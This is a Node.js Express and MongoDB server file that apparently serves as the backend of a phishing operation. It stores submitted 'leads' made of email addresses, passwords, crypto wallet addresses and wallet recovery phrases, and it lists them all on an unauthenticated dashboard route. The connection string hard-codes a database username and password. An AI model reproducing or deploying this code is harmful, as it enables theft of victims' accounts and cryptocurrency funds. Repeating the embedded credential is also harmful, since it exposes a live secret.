const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname)); // Serves all files in the root folder

// MongoDB Connection
const MONGO_URI = "mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Successfully connected to MongoDB Atlas"))
  .catch(err => console.error("MongoDB connection error:", err));

// Lead Schema
const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema, 'leads');

// Route to save lead data
app.post('/update', async (req, res) => {
    try {
        console.log("Data received:", req.body);
        const lead = new Lead(req.body);
        await lead.save();
        console.log("Lead saved successfully.");
        res.status(200).send("Saved");
    } catch (err) {
        console.error("Database save error:", err);
        res.status(500).send("Error saving lead.");
    }
});

// Route to fetch data for the dashboard
app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        console.error("Database fetch error:", err);
        res.status(500).send("Error fetching leads.");
    }
});

// Root route to serve the dashboard file directly
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is alive and running on port ${PORT}`);
});
